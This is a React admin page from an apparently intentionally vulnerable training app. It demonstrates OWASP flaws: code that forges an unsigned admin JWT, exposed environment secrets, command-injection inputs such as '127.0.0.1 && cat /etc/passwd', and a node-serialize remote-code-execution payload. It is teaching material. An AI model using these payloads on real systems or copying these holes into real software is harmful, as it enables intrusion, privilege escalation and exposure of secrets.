import React, { useState, useEffect } from 'react';
import { adminStats, adminPing, adminDeserialize, getToken } from '../utils/api';

export default function Admin({ user }) {
  const [stats, setStats] = useState(null);
  const [pingHost, setPingHost] = useState('');
  const [pingResult, setPingResult] = useState(null);
  const [deserInput, setDeserInput] = useState('');
  const [deserResult, setDeserResult] = useState(null);
  const [fakeToken, setFakeToken] = useState('');
  const [statsError, setStatsError] = useState('');

  useEffect(() => {
    loadStats();
  }, []);

  const loadStats = async () => {
    try {
      const res = await adminStats();
      setStats(res.data);
    } catch (err) {
      setStatsError(err.response?.data?.error || 'Access denied (login as admin first)');
    }
  };

  const handlePing = async () => {
    try {
      const res = await adminPing(pingHost);
      setPingResult(res.data);
    } catch (err) {
      setPingResult({ error: err.response?.data?.error });
    }
  };

  const handleDeserialize = async () => {
    try {
      let parsed;
      try { parsed = JSON.parse(deserInput); } catch { parsed = deserInput; }
      const res = await adminDeserialize(parsed);
      setDeserResult(res.data);
    } catch (err) {
      setDeserResult({ error: err.response?.data?.error });
    }
  };

  // JWT bypass using jwt.decode (no signature verification)
  const bypassAdmin = () => {
    // Create a fake token with isAdmin:true — backend uses jwt.decode not jwt.verify
    const header  = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
    const payload = btoa(JSON.stringify({ userId: 'fake', username: 'attacker', isAdmin: true, role: 'admin' }));
    const sig     = 'fakesignature';
    const token   = `${header}.${payload}.${sig}`;
    setFakeToken(token);
    // Store it and reload
    localStorage.setItem('token', token);
    window.location.reload();
  };

  return (
    <div>
      <div className="page-header">
        <h1>🔐 Admin Panel</h1>
        <span className="tag tag-red">Restricted Area</span>
      </div>

      {/* JWT bypass demo */}
      <div className="vuln-box">
        <strong>🎯 A01 + A02 Demo: JWT Signature Bypass</strong>
        <p style={{fontSize:'0.82rem', color:'#666', margin:'6px 0'}}>
          The admin middleware uses <code>jwt.decode()</code> instead of <code>jwt.verify()</code> —
          the signature is NEVER checked! Any token with <code>isAdmin: true</code> in the payload grants access.
        </p>
        <button className="btn btn-danger btn-sm" onClick={bypassAdmin}>
          🔓 Forge Admin Token (no secret needed)
        </button>
        {fakeToken && <pre style={{fontSize:'0.72rem', marginTop:'6px', wordBreak:'break-all'}}>{fakeToken}</pre>}
      </div>

      {/* Stats */}
      <div className="card">
        <h3 style={{marginBottom:'8px'}}>📊 Server Stats (A05: Info Disclosure)</h3>
        {statsError && <div className="alert alert-danger">{statsError}</div>}
        {stats && (
          <div>
            <div className="vuln-box">
              <strong>Environment variables and DB connection string exposed!</strong>
            </div>
            <pre style={{fontSize:'0.8rem', maxHeight:'300px', overflow:'auto'}}>
              {JSON.stringify(stats, null, 2)}
            </pre>
          </div>
        )}
      </div>

      {/* Command Injection */}
      <div className="card">
        <h3 style={{marginBottom:'8px'}}>🖥️ Ping Tool (A03: OS Command Injection)</h3>
        <div className="vuln-box">
          <strong>🎯 Command Injection via ping</strong>
          <p style={{fontSize:'0.82rem', color:'#666', margin:'4px 0'}}>
            Backend runs: <code>exec(`ping -c 3 {'{'}host{'}'}`)</code> — inject shell commands!
          </p>
          <div style={{fontSize:'0.8rem', color:'#555'}}>
            Try: <code>127.0.0.1; whoami</code><br/>
            Try: <code>127.0.0.1 && cat /etc/passwd</code><br/>
            Try: <code>127.0.0.1 | ls -la /</code>
          </div>
        </div>
        <div style={{display:'flex', gap:'8px'}}>
          <input value={pingHost} onChange={e => setPingHost(e.target.value)}
            placeholder="127.0.0.1; whoami"
            style={{flex:1, padding:'8px', border:'1px solid #ddd', borderRadius:'4px', fontFamily:'monospace'}} />
          <button className="btn btn-danger" onClick={handlePing}>Run Ping</button>
        </div>
        {pingResult && (
          <pre style={{marginTop:'8px', fontSize:'0.8rem', maxHeight:'200px', overflow:'auto'}}>
            {JSON.stringify(pingResult, null, 2)}
          </pre>
        )}
      </div>

      {/* Insecure Deserialization */}
      <div className="card">
        <h3 style={{marginBottom:'8px'}}>💀 Deserialize (A08: Insecure Deserialization / RCE)</h3>
        <div className="vuln-box">
          <strong>🎯 Remote Code Execution via node-serialize</strong>
          <p style={{fontSize:'0.82rem', color:'#666', margin:'4px 0'}}>
            The <code>node-serialize</code> package has a known RCE vulnerability.
            IIFEs (Immediately Invoked Function Expressions) in serialized data get executed on deserialization.
          </p>
          <p style={{fontSize:'0.8rem', color:'#555', margin:'4px 0'}}>
            RCE Payload (opens calc on Windows, creates file on Linux):
          </p>
          <pre style={{fontSize:'0.75rem', margin:'4px 0'}}>
{`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/pwned.txt')}()"}`}
          </pre>
        </div>
        <textarea rows={5} value={deserInput} onChange={e => setDeserInput(e.target.value)}
          placeholder={`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id > /tmp/pwned.txt')}()"}`}
          style={{width:'100%', padding:'8px', border:'1px solid #ddd', borderRadius:'4px',
                  fontFamily:'monospace', fontSize:'0.82rem', marginBottom:'8px'}} />
        <button className="btn btn-danger" onClick={handleDeserialize}>🔥 Deserialize</button>
        {deserResult && (
          <pre style={{marginTop:'8px', fontSize:'0.8rem', maxHeight:'150px', overflow:'auto'}}>
            {JSON.stringify(deserResult, null, 2)}
          </pre>
        )}
      </div>
    </div>
  );
}
